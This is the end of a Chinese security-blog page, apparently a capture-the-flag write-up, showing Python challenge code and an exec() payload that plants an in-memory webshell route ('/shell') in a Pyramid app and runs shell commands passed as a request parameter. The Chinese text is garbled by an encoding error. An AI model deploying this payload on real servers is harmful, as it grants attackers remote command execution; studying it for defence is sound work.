</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">all_data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">signature</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">sig_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">alg</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">all_data</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="n">secret</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">all_data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">key_bytes</span> <span class="o">=</span> <span class="n">all_data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">key</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">key_bytes</span><span class="p">)</span>  <span class="c1"># bytes</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># È™åËØÅÁ≠æÂêç</span>
</span></span><span class="line"><span class="cl">        <span class="n">is_valid</span> <span class="o">=</span> <span class="n">verify_signature</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">json_data</span><span class="p">,</span> <span class="n">signature</span><span class="p">,</span> <span class="n">alg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">is_valid</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">json_data</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="s2">&#34;something error&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_html</span><span class="p">(</span><span class="n">filname</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./static/&#39;</span> <span class="o">+</span> <span class="n">filname</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># ËØªÂèñÊñá‰ª∂ÂÜÖÂÆπ</span>
</span></span><span class="line"><span class="cl">        <span class="n">html_content</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">html_content</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰∏äÈù¢‰∏ÄÈ¢òÁî±‰∫éconfigÊòØÂ±ÄÈÉ®ÂèòÈáèËé∑Âèñ‰∏ç‰∫ÜÔºåËøôÈ¢òÂèØ‰ª•‰∫Ü</p>
<p>Áõ¥Êé•‰∏äÂÜÖÂ≠òÈ©¨payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">exec</span><span class="p">(</span><span class="s2">&#34;import sys;config = sys.modules[&#39;__main__&#39;].config;app=sys.modules[&#39;__main__&#39;].app;print(config);config.add_route(&#39;shell&#39;, &#39;/shell&#39;);config.add_view(lambda request: Response(__import__(&#39;os&#39;).popen(request.params.get(&#39;1&#39;)).read()),route_name=&#39;shell&#39;);app = config.make_wsgi_app()&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">ÂÜÖÂ≠òÈ©¨</a>
        
            <a href="/tags/flask/">Flask</a>
        
            <a href="/tags/tornado/">Tornado</a>
        
            <a href="/tags/django/">Django</a>
        
            <a href="/tags/pyramid/">Pyramid</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under 9u_l3</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Áõ∏ÂÖ≥ÊñáÁ´†</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/sstiflask/">
        
        
            <div class="article-image">
                <img src="/p/sstiflask/1.18690d4a1682b6ba067ba16c76b02b27.webp" 
                        width="2048" 
                        height="1536" 
                        loading="lazy"
                        alt="Featured image of post SSTI(flask)"
                        
                        data-hash="md5-GGkNShaCtroGe6FsdrArJw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">SSTI(flask)</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">
        
        
            <div class="article-image">
                <img src="/p/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1.ccbc46cf8a0366a09bdff353407255b7.webp" 
                        width="1792" 
                        height="2560" 
                        loading="lazy"
                        alt="Featured image of post pythonÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥û"
                        
                        data-hash="md5-zLxGz4oDZqCb3/NTQHJVtw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">pythonÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥û</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
        
        
            <div class="article-image">
                <img src="/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.a84481e2accdd7ee83233c01f9ed1648.jpg" 
                        width="3363" 
                        height="5979" 
                        loading="lazy"
                        alt="Featured image of post pickleÂèçÂ∫èÂàóÂåñ"
                        
                        data-hash="md5-qESB4qzN1&#43;6DIzwB&#43;e0WSA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">pickleÂèçÂ∫èÂàóÂåñ</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
        
        
            <div class="article-image">
                <img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.dc132e18a0a94c1b0e3d04241faabc01.png" 
                        width="928" 
                        height="1232" 
                        loading="lazy"
                        alt="Featured image of post pythonÂéüÂûãÈìæÊ±°Êüì"
                        
                        data-hash="md5-3BMuGKCpTBsOPQQkH6q8AQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">pythonÂéüÂûãÈìæÊ±°Êüì</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
<div id="waline" class="waline-container"></div>
<style>
    .waline-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
        --waline-font-size: var(--article-font-size);
    }
    .waline-container .wl-count {
        color: var(--card-text-color-main);
    }
</style><script>
    
    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 Êó†ÊïåÂèØÁà±ÁæéÂíïÂôú
    </section>
    
    <section class="powerby">
        ‰ΩøÁî® <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> ÊûÑÂª∫ <br />
        ‰∏ªÈ¢ò <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> Áî± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> ËÆæËÆ°
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

<style>
  body {
    background: url(https://0d000721999.github.io/background/1.webp) no-repeat center top;
    background-size: cover;
    background-attachment: fixed;
  }
</style>

 
<style>
  @font-face {
    font-family: 'ss';
    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
  }

  :root {
    --base-font-family: 'ss';
    --code-font-family: 'ss';
  }
</style>
<style>
    #TableOfContents > ul, ol {
        ul, ol {
            display: none;
        }
        .open {
            display: block;
        }
    }
</style>

<script>
    function initTocHide() {
        
        let toc = document.querySelector(".widget--toc");
        if (!toc) {
            return;
        }
        
        window.addEventListener('scroll', function() {
            
            let openUl = document.querySelectorAll(".open");
            if (openUl.length > 0) {
              openUl.forEach((ul) => {
                ul.classList.remove("open")
              })
            }
            
            let currentLi = document.querySelector(".active-class");
            if (!currentLi) {
                return
            }
            
            if (currentLi.children.length > 1) {
                currentLi.children[1].classList.add("open")
            }
            
            let ul = currentLi.parentElement;
            do {
                ul.classList.add("open");
                ul = ul.parentElement.parentElement
            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
        });
    }
    initTocHide()
</script>

<style>
    #backTopBtn {
        display: none;
        position: fixed;
        bottom: 30px;
        z-index: 99;
        cursor: pointer;
        width: 30px;
        height: 30px;
        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
    }
</style>

<script>
    

    function initScrollTop() {
        let rightSideBar = document.querySelector(".right-sidebar");
        if (!rightSideBar) {
            return;
        }
        
        let btn = document.createElement("div");
        btn.id = "backTopBtn";
        btn.onclick = backToTop
        rightSideBar.appendChild(btn)
        
        window.onscroll = function() {
            
            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                btn.style.display = "block";
            } else {
                btn.style.display = "none";
            }
        };
    }

    

    function backToTop(){
        window.scrollTo({ top: 0, behavior: "smooth" })
    }

    initScrollTop();
</script>


<script>   
  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@f09405fd";
  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
  const config = {
    
    path: {
      homePath: "/",
      modelPath: cdnPath + "/Resources/",
      cssPath: cssPath,
      tipsJsonPath: cdnPath + "/waifu-tips.json",
      tipsJsPath: cdnPath + "/waifu-tips.js",
      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
      live2dSdkPath: cdnPath + "/live2d-sdk.js"
    },
    
    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
    
    drag: {
      enable: true,
      direction: ["x", "y"]
    },
    
    switchType: "order"
  }

  
  if (screen.width >= 768) {
    Promise.all([
      loadExternalResource(config.path.cssPath, "css"),
      loadExternalResource(config.path.live2dCorePath, "js"),
      loadExternalResource(config.path.live2dSdkPath, "js"),
      loadExternalResource(config.path.tipsJsPath, "js")
    ]).then(() => {
      initWidget({
        waifuPath: config.path.tipsJsonPath,
        cdnPath: config.path.modelPath,
        tools: config.tools,
        dragEnable: config.drag.enable,
        dragDirection: config.drag.direction,
        switchType: config.switchType
      });
    });
  }

  
  function loadExternalResource(url, type) {
    return new Promise((resolve, reject) => {
      let tag;
      if (type === "css") {
        tag = document.createElement("link");
        tag.rel = "stylesheet";
        tag.href = url;
      }
      else if (type === "js") {
        tag = document.createElement("script");
        tag.src = url;
      }
      if (tag) {
        tag.onload = () => resolve(url);
        tag.onerror = () => reject(url);
        document.head.appendChild(tag);
      }
    });
  }
</script>

    </body>
</html>
